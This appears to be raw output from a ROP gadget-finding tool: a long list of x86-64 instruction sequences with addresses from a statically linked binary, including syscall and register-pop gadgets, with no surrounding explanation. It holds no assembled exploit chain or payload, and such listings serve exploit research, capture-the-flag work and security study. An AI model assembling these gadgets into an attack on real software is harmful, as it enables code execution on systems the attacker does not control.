0x0000000000444277 : add al, byte ptr [rax] ; add bh, dh ; ret 0xf800
0x0000000000445ae7 : add al, byte ptr [rax] ; add byte ptr [rax + 0x39], cl ; ret
0x0000000000466b22 : add al, byte ptr [rax] ; add byte ptr [rax + 0x39], cl ; ret 0xed75
0x000000000044dd6b : add al, byte ptr [rax] ; add byte ptr [rax + 0x63], cl ; ret
0x000000000041d4f2 : add al, byte ptr [rax] ; add byte ptr [rax + 1], cl ; clc ; add rax, rcx ; ret
0x0000000000472a1e : add al, byte ptr [rax] ; add byte ptr [rax + 1], cl ; ret 0x3a83
0x000000000044a3fd : add al, byte ptr [rax] ; add byte ptr [rax + rcx*2 - 0x77], ah ; adc dword ptr [rax - 0x39], ecx ; ret 0xffe0
0x0000000000400fb5 : add al, byte ptr [rax] ; add byte ptr [rax - 0x39], cl ; ret
0x00000000004563dd : add al, byte ptr [rax] ; add byte ptr [rax - 0x39], cl ; ret 0x2c20
0x0000000000467dca : add al, byte ptr [rax] ; add byte ptr [rax - 0x75], cl ; adc byte ptr [r8 - 0x7d], cl ; ret
0x0000000000439a74 : add al, byte ptr [rax] ; add byte ptr [rax - 0x77], cl ; sal ebx, 1 ; movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x000000000041d1c7 : add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000430b61 : add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000041d1f5 : add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000044a2f2 : add al, byte ptr [rax] ; add byte ptr [rax - 0x7f], cl ; ret 0x200
0x0000000000469676 : add al, byte ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4810
0x000000000043c849 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp rax
0x0000000000460e94 : add al, byte ptr [rax] ; add byte ptr [rax], al ; ret
0x000000000046183a : add al, byte ptr [rax] ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00000000004384f4 : add al, byte ptr [rax] ; add byte ptr [rbx - 0x7bf0ed07], al ; ret 2
0x0000000000470514 : add al, byte ptr [rax] ; add byte ptr [rcx + 0xc8b48d8], cl ; ret 0xb60f
0x000000000046cb73 : add al, byte ptr [rax] ; add byte ptr [rcx - 0x77], al ; ret
0x0000000000416733 : add al, byte ptr [rax] ; cmove rax, rdx ; ret
0x0000000000415c7c : add al, byte ptr [rax] ; cmovne rax, rdx ; ret
0x0000000000465721 : add al, byte ptr [rax] ; mov edx, 0x828 ; call 0x4019f9
0x000000000046575e : add al, byte ptr [rax] ; mov edx, 0x829 ; call 0x4019f9
0x000000000046f95a : add al, byte ptr [rax] ; movsxd rax, dword ptr [rdx + rax*4] ; add rax, rdx ; jmp rax
0x0000000000467bdb : add al, byte ptr [rax] ; movsxd rax, dword ptr [rsi + r12*4] ; add rax, rsi ; jmp rax
0x000000000045c539 : add al, byte ptr [rax] ; movsxd rax, dword ptr [rsi + rax*4] ; add rax, rsi ; jmp rax
0x000000000043eeca : add al, byte ptr [rax] ; xor edx, edx ; cmp ebx, eax ; setne dl ; jmp 0x43eebe
0x000000000046231e : add al, byte ptr [rbp - 0xcb28a37] ; ret
0x0000000000457648 : add al, byte ptr [rcx + 0x29] ; ret
0x000000000043da0e : add al, byte ptr [rcx + 0x39] ; ret
0x0000000000496731 : add al, byte ptr [rdx + 0xe] ; nop ; add dword ptr [rsi + rcx + 0x10], ecx ; ret
0x0000000000416b01 : add al, byte ptr cs:[rax] ; cmovne rax, rdx ; ret
0x00000000004168ed : add al, byte ptr ss:[rax] ; cmovne rax, rdx ; ret
0x0000000000446cf5 : add al, ch ; cmc ; lodsb al, byte ptr [rsi] ; sti ; inc dword ptr [rcx - 0x77] ; ret 0x17e9
0x0000000000498a97 : add al, ch ; cwde ; cli ; call qword ptr [rax]
0x000000000043b3be : add al, ch ; inc byte ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret 0x8b48
0x000000000049ae23 : add al, ch ; outsb dx, byte ptr [rsi] ; add byte ptr [rax], al ; cwde ; pop rbp ; cld ; jmp qword ptr [rax]
0x000000000043ee2d : add al, ch ; pop rbp ; ret
0x0000000000402837 : add al, ch ; ret
0x0000000000472e38 : add al, ch ; ret 0xb8d1
0x000000000043ff70 : add al, ch ; ret 0xfc04
0x0000000000499917 : add al, ch ; sbb bl, bh ; call qword ptr [rax]
0x00000000004139e8 : add al, ch ; xchg eax, edx ; ret 0xffff
0x000000000049ac87 : add al, cl ; push rsp ; cld ; jmp qword ptr [rax]
0x000000000049802b : add al, dh ; add byte ptr [rax], al ; rcl byte ptr [rcx - 6], 1 ; call qword ptr [rdx]
0x000000000047fb9f : add al, dh ; popfq ; cld ; jmp rax
0x000000000049c81f : add al, dh ; xor ch, bh ; jmp qword ptr [rdx]
0x000000000049802f : add al, dl ; push rcx ; cli ; call qword ptr [rdx]
0x000000000049ac9f : add al, dl ; push rdi ; cld ; jmp qword ptr [rbx]
0x000000000049945f : add al, dl ; sti ; cli ; call rsp
0x000000000047ed0d : add bh, ah ; jmp qword ptr [rbx]
0x000000000049bf16 : add bh, ah ; ret
0x00000000004402bf : add bh, al ; add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x000000000044d08f : add bh, al ; test dword ptr [rax], ecx ; idiv edi ; call qword ptr [rax]
0x0000000000406fef : add bh, bh ; adc ecx, dword ptr [rax - 0x7d] ; ret
0x0000000000400fcd : add bh, bh ; push rbx ; adc byte ptr [rax - 0x7d], cl ; ret
0x0000000000468326 : add bh, bh ; ror byte ptr [rax - 0x7d], 1 ; ret
0x00000000004703cf : add bh, bh ; ror dword ptr [rax - 0x77], cl ; ret
0x000000000046f129 : add bh, byte ptr [rax + 1] ; ret
0x000000000046f284 : add bh, byte ptr [rax + 2] ; ret
0x000000000043b78b : add bh, byte ptr [rax - 1] ; ret
0x00000000004388c2 : add bh, byte ptr [rcx] ; enter -0x3fe7, -0x7d ; fdivr st(7) ; ret
0x000000000048c62d : add bh, ch ; jmp qword ptr [rax]
0x0000000000400d9a : add bh, dh ; ret 0
0x0000000000444279 : add bh, dh ; ret 0xf800
0x000000000040753f : add bh, dh ; ret 0xffef
0x0000000000460e91 : add bl, al ; mov eax, 2 ; ret
0x0000000000472a3a : add bl, al ; nop dword ptr [rax] ; xor eax, eax ; ret
0x00000000004945e5 : add bl, byte ptr [rax + 0xa] ; ret
0x000000000047454b : add bl, ch ; add eax, 0x1489066 ; ret 0xb70f
0x0000000000413740 : add bl, ch ; ret
0x0000000000475113 : add bl, dh ; movups xmmword ptr [rsp - 0x28], xmm0 ; ret
0x00000000004009cf : add bl, dh ; ret
0x000000000047d2f0 : add bl, dl ; cli ; call qword ptr [rax + 0x20fffad2]
0x00000000004057ee : add bl, sil ; ret
0x000000000045f1b6 : add byte ptr [r8 - 0x77], r9b ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x0000000000465e8e : add byte ptr [r8 - 0x77], r9b ; ret 0x314c
0x0000000000498a95 : add byte ptr [r8], al ; call 0x1149853b
0x00000000004982b5 : add byte ptr [r8], al ; mov byte ptr [rax - 6], bl ; call qword ptr [rcx]
0x0000000000498265 : add byte ptr [r8], al ; pop rax ; pop rax ; cli ; call qword ptr [rax]
0x000000000049827d : add byte ptr [r8], al ; push rax ; pop rax ; cli ; call qword ptr [rdx]
0x000000000044232d : add byte ptr [r8], r8b ; add byte ptr [rax], al ; add byte ptr [rax + 1], cl ; ret
0x0000000000415dbc : add byte ptr [r8], r8b ; cmovne rax, rdx ; ret
0x00000000004984a1 : add byte ptr [r8], r8b ; push -6 ; jmp qword ptr [rdx]
0x0000000000497ebb : add byte ptr [rax + 0x1000003f], al ; cli ; jmp qword ptr [rcx]
0x000000000049527b : add byte ptr [rax + 0x13], al ; add byte ptr [rax], al ; and byte ptr [rbx - 9], bl ; call rdi
0x0000000000415bbf : add byte ptr [rax + 0x16], bh ; ret
0x0000000000497717 : add byte ptr [rax + 0x28], bh ; cli ; call qword ptr [rax]
0x0000000000497767 : add byte ptr [rax + 0x29], bh ; cli ; call qword ptr [rbx]
0x0000000000409ec8 : add byte ptr [rax + 0x29], cl ; ret
0x0000000000444453 : add byte ptr [rax + 0x29], cl ; ret 0x8348
0x0000000000453f31 : add byte ptr [rax + 0x29], cl ; ret 0x8349
0x00000000004665f7 : add byte ptr [rax + 0x29], cl ; ret 0x8d48
0x000000000049773f : add byte ptr [rax + 0x29], dl ; cli ; call qword ptr [rdx]
0x000000000049c747 : add byte ptr [rax + 0x2d], bh ; std ; jmp qword ptr [rdx]
0x00000000004971ab : add byte ptr [rax + 0x32], dh ; add byte ptr [rax], al ; add byte ptr [rax - 8], dh ; call rsp
0x00000000004974ab : add byte ptr [rax + 0x35], dh ; add byte ptr [rax], al ; shr ah, 0xf9 ; jmp qword ptr [rbx]
0x0000000000462385 : add byte ptr [rax + 0x39], cl ; dec byte ptr [rax + 0xf] ; ret 0x31c3
0x0000000000406fcf : add byte ptr [rax + 0x39], cl ; ret
0x0000000000475313 : add byte ptr [rax + 0x39], cl ; ret 0x830f
0x000000000040b18f : add byte ptr [rax + 0x39], cl ; ret 0x850f
0x00000000004753a8 : add byte ptr [rax + 0x39], cl ; ret 0x9272
0x000000000046b53d : add byte ptr [rax + 0x39], cl ; ret 0xd589
0x0000000000466b24 : add byte ptr [rax + 0x39], cl ; ret 0xed75
0x00000000004645fe : add byte ptr [rax + 0x39], cl ; ret 0xf48
0x000000000043dc1f : add byte ptr [rax + 0x3b], cl ; push rdi ; adc byte ptr [rbx - 0x1e], dh ; ret
0x0000000000497b6f : add byte ptr [rax + 0x3b], dh ; cli ; jmp qword ptr [rcx]
0x0000000000497ea3 : add byte ptr [rax + 0x3f], ch ; add byte ptr [rax], al ; clc ; cli ; jmp qword ptr [rcx]
0x0000000000497e8b : add byte ptr [rax + 0x3f], dl ; add byte ptr [rax], al ; loopne 0x497ee2 ; cli ; jmp qword ptr [rcx]
0x000000000049827b : add byte ptr [rax + 0x43], al ; add byte ptr [rax], al ; push rax ; pop rax ; cli ; call qword ptr [rdx]
0x00000000004982b3 : add byte ptr [rax + 0x43], bh ; add byte ptr [rax], al ; mov byte ptr [rax - 6], bl ; call qword ptr [rcx]
0x0000000000498a93 : add byte ptr [rax + 0x4b], bl ; add byte ptr [rax], al ; call 0x1149853d
0x0000000000499583 : add byte ptr [rax + 0x56], cl ; add byte ptr [rax], al ; sbb byte ptr [rax], cl ; sti ; call qword ptr [rdx]
0x00000000004981c7 : add byte ptr [rax + 0x57], bh ; cli ; jmp qword ptr [rcx]
0x00000000004993f3 : add byte ptr [rax + 0x58000054], bh ; cmc ; cli ; call rbx
0x0000000000498267 : add byte ptr [rax + 0x58], bl ; cli ; call qword ptr [rax]
0x000000000049827f : add byte ptr [rax + 0x58], dl ; cli ; call qword ptr [rdx]
0x0000000000499a9b : add byte ptr [rax + 0x5b], ah ; add byte ptr [rax], al ; and byte ptr [rcx], 0xfb ; call rsp
0x00000000004059dd : add byte ptr [rax + 0x63], cl ; adc al, 0x97 ; add rdx, rdi ; jmp rdx
0x000000000045bed5 : add byte ptr [rax + 0x63], cl ; add al, 0x81 ; add rax, rcx ; jmp rax
0x0000000000401b60 : add byte ptr [rax + 0x63], cl ; add al, 0x82 ; add rax, rdx ; jmp rax
0x000000000045c53a : add byte ptr [rax + 0x63], cl ; add al, 0x86 ; add rax, rsi ; jmp rax
0x000000000043b3f2 : add byte ptr [rax + 0x63], cl ; add al, 0x9a ; add rax, rdx ; jmp rax
0x000000000043a436 : add byte ptr [rax + 0x63], cl ; add al, 0xbe ; add rax, rsi ; jmp rax
0x0000000000449290 : add byte ptr [rax + 0x63], cl ; ret
0x0000000000455f7a : add byte ptr [rax + 0x63], cl ; ret 0x8948
0x0000000000476de3 : add byte ptr [rax + 0x63], cl ; ret 0xbc80
0x000000000045c81b : add byte ptr [rax + 0x63], cl ; ror dword ptr [rax - 0x75], 4 ; ret 0x8548
0x000000000044c161 : add byte ptr [rax + 0x63], cl ; ror dword ptr [rax - 0x7d], cl ; ret 0x4820
0x0000000000461bdf : add byte ptr [rax + 0x66], bh ; syscall ; ret
0x0000000000461bff : add byte ptr [rax + 0x68], bh ; syscall ; ret
0x0000000000461bef : add byte ptr [rax + 0x6b], bh ; syscall ; ret
0x000000000049aa83 : add byte ptr [rax + 0x6b], cl ; add byte ptr [rax], al ; mov byte ptr [rsi - 4], al ; jmp qword ptr [rbx]
0x0000000000461c0f : add byte ptr [rax + 0x6c], bh ; syscall ; ret
0x000000000049ac9b : add byte ptr [rax + 0x6d], ah ; add byte ptr [rax], al ; rcl byte ptr [rdi - 4], 1 ; jmp qword ptr [rbx]
0x000000000049cf87 : add byte ptr [rax + 0x70], cl ; std ; jmp qword ptr [rdx]
0x000000000049b07b : add byte ptr [rax + 0x71], al ; add byte ptr [rax], al ; xor byte ptr [rbx - 4], ch ; jmp qword ptr [rcx]
0x00000000004330af : add byte ptr [rax + 0x74c08402], cl ; adc cl, byte ptr [rax - 1] ; ret 0x2288
0x00000000004981c3 : add byte ptr [rax + 0x78000042], cl ; push rdi ; cli ; jmp qword ptr [rcx]
0x0000000000499ec3 : add byte ptr [rax + 0x7800005f], cl ; ret
0x0000000000436aef : add byte ptr [rax + 0x78d4837], cl ; ret
0x0000000000415bd7 : add byte ptr [rax + 0xc], bh ; pop rbx ; ret
0x000000000049963f : add byte ptr [rax + 0xd], ah ; sti ; call qword ptr [rcx]
0x00000000004995ff : add byte ptr [rax + 0xd], al ; sti ; call qword ptr [rdi]
0x0000000000499617 : add byte ptr [rax + 0xd], cl ; sti ; call qword ptr [rcx]
0x0000000000416a59 : add byte ptr [rax + 0xf4802e5], al ; ret 0xc3f3
0x000000000043a507 : add byte ptr [rax + 0xf48f0e5], al ; ret 0xc35b
0x000000000040c84f : add byte ptr [rax + 0xf], al ; mov dh, 0xc5 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000045fac5 : add byte ptr [rax + 0xf], cl ; mov ebp, 0xf80148c0 ; ret
0x00000000004416ef : add byte ptr [rax + 0xf], cl ; mov esi, 0x83480147 ; ret
0x00000000004126d4 : add byte ptr [rax + 0xf], cl ; ret
0x0000000000466ca6 : add byte ptr [rax + 0xf], cl ; ret 0x3e80
0x0000000000415d04 : add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x00000000004440b2 : add byte ptr [rax + 0xf], cl ; ret 0x8948
0x000000000041364c : add byte ptr [rax + 0xf], cl ; ret 0x894c
0x0000000000466cf5 : add byte ptr [rax + 0xf], cl ; ret 0x8b48
0x000000000043a47a : add byte ptr [rax + 0xf], cl ; ret 0xc35b
0x0000000000415c7d : add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x0000000000444c0d : add byte ptr [rax + 0xf], cl ; ret 0xf685
0x000000000041681d : add byte ptr [rax + 0xf], cl ; ret 0xfc3
0x000000000046f0ec : add byte ptr [rax + 1], bh ; ret
0x000000000041d4f4 : add byte ptr [rax + 1], cl ; clc ; add rax, rcx ; ret
0x0000000000402157 : add byte ptr [rax + 1], cl ; ret
0x000000000046e69f : add byte ptr [rax + 1], cl ; ret 0x149
0x0000000000472a20 : add byte ptr [rax + 1], cl ; ret 0x3a83
0x000000000046f2fd : add byte ptr [rax + 2], bh ; ret
0x0000000000462950 : add byte ptr [rax + 9], cl ; ret 0x850f
0x00000000004868ab : add byte ptr [rax + rax + 0xbf0000], bh ; add byte ptr [rax], al ; ret 0
0x000000000049bfd7 : add byte ptr [rax + rax*4 + 0x4f40000], bl ; std ; call rdx
0x000000000045ef0f : add byte ptr [rax + rax], al ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x0000000000416784 : add byte ptr [rax + rax], al ; add byte ptr [rsi - 9], dh ; ret 0
0x000000000041373c : add byte ptr [rax + rax], cl ; add byte ptr [rax], al ; jmp 0x41370c
0x0000000000413429 : add byte ptr [rax + rax], cl ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00000000004604d7 : add byte ptr [rax + rax], cl ; add byte ptr [rbx + rax - 0xd], dh ; ret
0x000000000049772b : add byte ptr [rax + rbp - 6], dh ; jmp rbx
0x00000000004976db : add byte ptr [rax + rbp - 6], dl ; call qword ptr [rdx]
0x000000000044a30d : add byte ptr [rax + rcx - 0xd], dh ; ret
0x000000000044a3ff : add byte ptr [rax + rcx*2 - 0x77], ah ; adc dword ptr [rax - 0x39], ecx ; ret 0xffe0
0x0000000000487a57 : add byte ptr [rax + rdx + 0x10bf0000], bh ; add byte ptr [rax], al ; ret 0x10
0x0000000000467564 : add byte ptr [rax - 0x168b7f80], 0x89 ; ret 0xeac1
0x000000000049bfc3 : add byte ptr [rax - 0x27ffff80], cl ; add al, 0xfd ; jmp qword ptr [rcx]
0x0000000000400fb7 : add byte ptr [rax - 0x39], cl ; ret
0x0000000000407eb3 : add byte ptr [rax - 0x39], cl ; ret 0x2c20
0x000000000045334d : add byte ptr [rax - 0x39], cl ; ret 0x32c8
0x00000000004063af : add byte ptr [rax - 0x39], cl ; ret 0xffc0
0x00000000004137ab : add byte ptr [rax - 0x39], cl ; ret 0xffdf
0x000000000046ff35 : add byte ptr [rax - 0x39], cl ; ret 0xffff
0x00000000004610ef : add byte ptr [rax - 0x39], cl ; rol byte ptr [rbx], 0 ; add byte ptr [rax], al ; ret
0x00000000004610cf : add byte ptr [rax - 0x39], cl ; rol byte ptr [rcx], 0 ; add byte ptr [rax], al ; ret
0x000000000046112f : add byte ptr [rax - 0x39], cl ; rol byte ptr [rdi], 0 ; add byte ptr [rax], al ; ret
0x00000000004610df : add byte ptr [rax - 0x39], cl ; rol byte ptr [rdx], 0 ; add byte ptr [rax], al ; ret
0x000000000046111f : add byte ptr [rax - 0x39], cl ; rol byte ptr [rsi], 0 ; add byte ptr [rax], al ; ret
0x000000000049dca7 : add byte ptr [rax - 0x3c], bl ; std ; jmp qword ptr [rax]
0x0000000000447ccb : add byte ptr [rax - 0x3f], cl ; ret 0x4811
0x0000000000448600 : add byte ptr [rax - 0x3f], cl ; ret 0x6411
0x000000000049dac7 : add byte ptr [rax - 0x43], cl ; std ; call qword ptr [rdx]
0x00000000004981f3 : add byte ptr [rax - 0x47ffffbe], bh ; push rdi ; cli ; jmp qword ptr [rdi]
0x00000000004947f3 : add byte ptr [rax - 0x47fffff8], bh ; and al, 0xf7 ; call rsp
0x000000000049ceeb : add byte ptr [rax - 0x4fffff71], dh ; pop rdi ; std ; jmp qword ptr [rcx]
0x000000000044fb9f : add byte ptr [rax - 0x50743], al ; jmp qword ptr [rax]
0x000000000049d73c : add byte ptr [rax - 0x57a00000], bl ; std ; call qword ptr [rbx]
0x000000000049d73f : add byte ptr [rax - 0x58], ah ; std ; call qword ptr [rbx]
0x000000000049d1cb : add byte ptr [rax - 0x5fffff6e], dl ; jl 0x49d1d8 ; call qword ptr [rdx]
0x0000000000497397 : add byte ptr [rax - 0x66], ch ; stc ; call qword ptr [rax]
0x000000000049cf83 : add byte ptr [rax - 0x70], cl ; add byte ptr [rax], al ; jo 0x49cf90 ; jmp qword ptr [rdx]
0x000000000043ee7f : add byte ptr [rax - 0x73], cl ; add eax, 0x263479 ; ret
0x0000000000442201 : add byte ptr [rax - 0x73], cl ; add qword ptr [rax - 0x7d], r9 ; ret 0x8b01
0x0000000000411e22 : add byte ptr [rax - 0x73], cl ; push rax ; adc dh, dh ; ret 0xf0f
0x00000000004101f5 : add byte ptr [rax - 0x73], cl ; push rcx ; dec dword ptr [rax - 0x7b] ; ret 0x850f
0x0000000000467dcc : add byte ptr [rax - 0x75], cl ; adc byte ptr [r8 - 0x7d], cl ; ret
0x0000000000410baf : add byte ptr [rax - 0x75], cl ; adc byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00000000004709e7 : add byte ptr [rax - 0x75], cl ; adc cl, byte ptr [rcx + 0x48b48d8] ; ret 0x8b48
0x0000000000474d18 : add byte ptr [rax - 0x75], cl ; add al, 0x24 ; add rsp, 0x38 ; ret
0x0000000000459c7e : add byte ptr [rax - 0x75], cl ; add al, 0xf0 ; jmp rax
0x000000000044f1ff : add byte ptr [rax - 0x75], cl ; add al, 0xf8 ; jmp rax
0x0000000000447cff : add byte ptr [rax - 0x75], cl ; add eax, 0x25c171 ; ret
0x00000000004403ef : add byte ptr [rax - 0x75], cl ; add eax, 0x264531 ; ret
0x000000000040ecdf : add byte ptr [rax - 0x75], cl ; add eax, 0x292439 ; ret
0x00000000004067a7 : add byte ptr [rax - 0x75], cl ; and al, 8 ; call rax
0x000000000044037f : add byte ptr [rax - 0x75], cl ; cmp ecx, dword ptr [rax - 0x7d] ; ret
0x000000000041512f : add byte ptr [rax - 0x75], cl ; je 0x415161 ; sub byte ptr [rax - 0x77], cl ; out dx, eax ; call rax
0x0000000000406f22 : add byte ptr [rax - 0x75], cl ; js 0x406f4c ; call rdx
0x000000000045e80f : add byte ptr [rax - 0x75], cl ; mov rax, qword ptr [rax + 0x4c] ; ret
0x0000000000400e7d : add byte ptr [rax - 0x75], cl ; push rax ; and byte ptr [rax + 1], cl ; ret 0xb70f
0x000000000042167f : add byte ptr [rax - 0x75], cl ; push rsi ; clc ; mov qword ptr [rdi - 8], rdx ; ret
0x0000000000440b49 : add byte ptr [rax - 0x75], cl ; ret
0x0000000000473567 : add byte ptr [rax - 0x75], cl ; xor cl, byte ptr [rax - 0x7d] ; ret 0xf08
0x0000000000409fdf : add byte ptr [rax - 0x76b80000], al ; ret
0x000000000046f4b6 : add byte ptr [rax - 0x77], cl ; add eax, 0x234baa ; ret
0x0000000000410a7a : add byte ptr [rax - 0x77], cl ; add eax, 0x290dde ; ret
0x000000000040f60c : add byte ptr [rax - 0x77], cl ; add eax, 0x2921cc ; ret
0x000000000040f5dc : add byte ptr [rax - 0x77], cl ; add eax, 0x292204 ; ret
0x000000000040a4f2 : add byte ptr [rax - 0x77], cl ; clc ; ret
0x000000000040bf43 : add byte ptr [rax - 0x77], cl ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x0000000000460624 : add byte ptr [rax - 0x77], cl ; fucomip st(0) ; ret
0x00000000004757be : add byte ptr [rax - 0x77], cl ; fucomip st(1) ; ret
0x000000000043dc2f : add byte ptr [rax - 0x77], cl ; ja 0x43dc59 ; ret
0x000000000040a643 : add byte ptr [rax - 0x77], cl ; mov edx, 0x130 ; pop rbx ; ret
0x0000000000403118 : add byte ptr [rax - 0x77], cl ; ret
0x000000000043b5eb : add byte ptr [rax - 0x77], cl ; ret 0x16e9
0x000000000041424c : add byte ptr [rax - 0x77], cl ; ret 0x1bf
0x000000000046ad6f : add byte ptr [rax - 0x77], cl ; ret 0x2948
0x0000000000409056 : add byte ptr [rax - 0x77], cl ; ret 0x294c
0x000000000040b0da : add byte ptr [rax - 0x77], cl ; ret 0x294d
0x0000000000465e8f : add byte ptr [rax - 0x77], cl ; ret 0x314c
0x0000000000478b8c : add byte ptr [rax - 0x77], cl ; ret 0x3948
0x000000000043b697 : add byte ptr [rax - 0x77], cl ; ret 0x6ae9
0x0000000000402722 : add byte ptr [rax - 0x77], cl ; ret 0x7be9
0x000000000044e71b : add byte ptr [rax - 0x77], cl ; ret 0x8148
0x000000000041145f : add byte ptr [rax - 0x77], cl ; ret 0x8348
0x00000000004024a2 : add byte ptr [rax - 0x77], cl ; ret 0x8548
0x0000000000447c5c : add byte ptr [rax - 0x77], cl ; ret 0x8948
0x00000000004161fb : add byte ptr [rax - 0x77], cl ; ret 0x8b48
0x00000000004782df : add byte ptr [rax - 0x77], cl ; ret 0x8d48
0x0000000000402abb : add byte ptr [rax - 0x77], cl ; ret 0xc031
0x00000000004542ff : add byte ptr [rax - 0x77], cl ; ret 0xc148
0x000000000046380a : add byte ptr [rax - 0x77], cl ; ret 0xf631
0x000000000043b602 : add byte ptr [rax - 0x77], cl ; ret 0xffe9
0x000000000040b7f9 : add byte ptr [rax - 0x77], cl ; ror dword ptr [rax - 0x39], cl ; ret 0x2c20
0x00000000004392d0 : add byte ptr [rax - 0x77], cl ; sal ebx, 1 ; movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x000000000046d231 : add byte ptr [rax - 0x77], cl ; sbb byte ptr [r8 + 0x5a], bl ; pop rbx ; ret
0x0000000000476eff : add byte ptr [rax - 0x77], cl ; shr cl, 1 ; ret 0xfffe
0x0000000000467213 : add byte ptr [rax - 0x77], cl ; xchg dword ptr [rax], eax ; add eax, dword ptr [rax] ; add bl, dh ; ret
0x000000000040829c : add byte ptr [rax - 0x77], cl ; xchg eax, ecx ; xor byte ptr [rcx], al ; add byte ptr [rax], al ; ret
0x0000000000474df6 : add byte ptr [rax - 0x7ab70000], al ; ret 0x840f
0x000000000045ff2f : add byte ptr [rax - 0x7b], cl ; div byte ptr [rbp + 4] ; xor rax, rax ; ret
0x0000000000455218 : add byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x84 ; ret 5
0x000000000040c04f : add byte ptr [rax - 0x7b], cl ; sal byte ptr [rbp + 0xb], cl ; xor eax, eax ; ret
0x000000000047aae7 : add byte ptr [rax - 0x7b], cl ; sal byte ptr [rbp + 3], cl ; ret
0x000000000047903e : add byte ptr [rax - 0x7d], cl ; and al, 0x10 ; or byte ptr [rax - 0x7d], cl ; ret
0x000000000041463f : add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x0000000000412b17 : add byte ptr [rax - 0x7d], cl ; clc ; add cl, byte ptr [rax + 0xf] ; ret 0x8948
0x000000000041262c : add byte ptr [rax - 0x7d], cl ; clc ; add cl, byte ptr [rax + 0xf] ; ret 0x8d44
0x000000000046b37d : add byte ptr [rax - 0x7d], cl ; clc ; dec dword ptr [rax + 0xf] ; ret 0x66c3
0x0000000000415c3d : add byte ptr [rax - 0x7d], cl ; clc ; dec dword ptr [rax + 0xf] ; ret 0x8348
0x0000000000401979 : add byte ptr [rax - 0x7d], cl ; clc ; dec dword ptr [rax - 0x77] ; ret
0x000000000040d77f : add byte ptr [rax - 0x7d], cl ; jg 0x40d7c5 ; add byte ptr [rcx + rcx - 0xd], dh ; ret
0x000000000045dfe6 : add byte ptr [rax - 0x7d], cl ; jle 0x45e024 ; add byte ptr [rdx + rax - 0xd], dh ; ret
0x00000000004137cb : add byte ptr [rax - 0x7d], cl ; jmp qword ptr [rax]
0x000000000040569f : add byte ptr [rax - 0x7d], cl ; ret
0x00000000004389bf : add byte ptr [rax - 0x7d], cl ; ret 0x3a01
0x0000000000407687 : add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x000000000047044f : add byte ptr [rax - 0x7d], cl ; ret 0x4808
0x000000000046967a : add byte ptr [rax - 0x7d], cl ; ret 0x4810
0x000000000044c144 : add byte ptr [rax - 0x7d], cl ; ret 0x481e
0x000000000045f44e : add byte ptr [rax - 0x7d], cl ; ret 0x4901
0x000000000041c689 : add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004782bf : add byte ptr [rax - 0x7d], cl ; ret 0x8001
0x000000000045c42f : add byte ptr [rax - 0x7d], cl ; ret 0x8b04
0x000000000042f643 : add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000041c6b7 : add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x0000000000444fd7 : add byte ptr [rax - 0x7d], cl ; ret 0xf01
0x00000000004180bf : add byte ptr [rax - 0x7d], cl ; rol byte ptr [rax + 0x48], 0x83 ; ret 0x4840
0x000000000046006f : add byte ptr [rax - 0x7d], cl ; rol byte ptr [rax + 0x49], 0x39 ; ret 0x2774
0x0000000000448b28 : add byte ptr [rax - 0x7d], cl ; rol byte ptr [rcx], 0x83 ; ret 0x4801
0x0000000000473d4a : add byte ptr [rax - 0x7d], cl ; ror byte ptr [rax], 0x83 ; ret 0x3901
0x000000000049c0a3 : add byte ptr [rax - 0x7f], ch ; add byte ptr [rax], al ; call 0x2749bdbc
0x000000000044a2f4 : add byte ptr [rax - 0x7f], cl ; ret 0x200
0x00000000004252eb : add byte ptr [rax - 0x7f], cl ; ret 0x80
0x00000000004993f7 : add byte ptr [rax - 0xb], bl ; cli ; call rbx
0x0000000000456147 : add byte ptr [rax - 1], bh ; mov qword ptr [rdi], rsi ; ret
0x0000000000409aba : add byte ptr [rax - 1], bh ; ret
0x000000000049c57b : add byte ptr [rax - 3], dh ; call rdi
0x00000000004971b0 : add byte ptr [rax - 8], dh ; call rsp
0x0000000000402834 : add byte ptr [rax], 0 ; add al, ch ; ret
0x000000000040cd1a : add byte ptr [rax], 0 ; add bl, dh ; ret
0x00000000004022fd : add byte ptr [rax], 0 ; add byte ptr [rax - 0x39], cl ; ret
0x0000000000427acb : add byte ptr [rax], 0 ; add byte ptr [rax], al ; mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; ret
0x000000000043a4bb : add byte ptr [rax], 0 ; add byte ptr [rax], al ; movzx eax, cl ; pop rbx ; ret
0x000000000043d1f3 : add byte ptr [rax], 0 ; add byte ptr [rax], al ; ret
0x000000000041e34b : add byte ptr [rax], 0 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000047ad9d : add byte ptr [rax], 0 ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x000000000041e8b1 : add byte ptr [rax], 0 ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x00000000004654d6 : add byte ptr [rax], 0 ; add cl, ch ; ret
0x000000000049bfd9 : add byte ptr [rax], 0 ; hlt ; add al, 0xfd ; call rdx
